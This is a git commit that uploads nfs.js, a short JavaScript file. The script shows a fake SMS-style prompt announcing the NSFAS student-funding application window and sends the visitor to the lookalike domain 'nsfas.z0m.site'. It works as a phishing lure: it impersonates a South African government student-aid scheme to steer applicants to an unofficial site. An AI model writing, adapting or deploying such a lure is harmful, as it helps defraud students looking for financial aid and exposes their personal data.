92c83dab457f7e9d51bec4c1d6be3d4c5bafbd80
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-09-29 13:56:24 +0530

    Add files via upload

---
+++ nfs.js
@@ -0,0 +1,6 @@
+
+var password = 'NSFAS APPLICATION 2025'
+password=prompt('SMS: The NSFAS application window is open for online Application. kindly press Ok to start application now ','NSFAS APPLICATION 2025');
+if (password != 'NSFAS APPLICATION 2025') {
+location.href='https://nsfas.z0m.site/';
+}
